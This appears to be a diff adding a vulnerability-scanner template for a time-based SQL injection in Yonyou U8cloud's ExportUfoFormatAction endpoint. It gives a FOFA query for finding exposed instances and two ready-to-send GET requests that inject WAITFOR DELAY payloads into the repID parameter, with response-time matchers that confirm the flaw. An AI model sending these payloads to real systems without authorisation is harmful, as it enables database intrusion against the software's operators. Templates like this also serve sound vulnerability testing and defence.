@@ -1,0 +1,40 @@
+## id: VEID-2024-0510
+## name: 用友U8cloud-ExportUfoFormatAction存在SQL注入漏洞
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2024
+## description: 用友U8cloud-ExportUfoFormatAction存在SQL延迟注入漏洞
+## fofa-query: app="用友-U8-Cloud"
+## verification: true
+
+
+
+GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.ExportUfoFormatAction&method=&repID=1%27);WAITFOR+DELAY+%270:0:5%27--+ HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/json
+
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: response_time >= 5
+#@ matcher: status_code == 200
+
+
+---
+
+GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.ExportUfoFormatAction&method=&repID=1%27);WAITFOR+DELAY+%270:0:8%27--+ HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/json
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: response_time >= 8
+#@ matcher: status_code == 200
+
+
+
+
+
+# @VEIL-STAMP: 4228b7631efba0dddb6857176844d56e8664868734f2b6d4b4e55ecbf60de45a
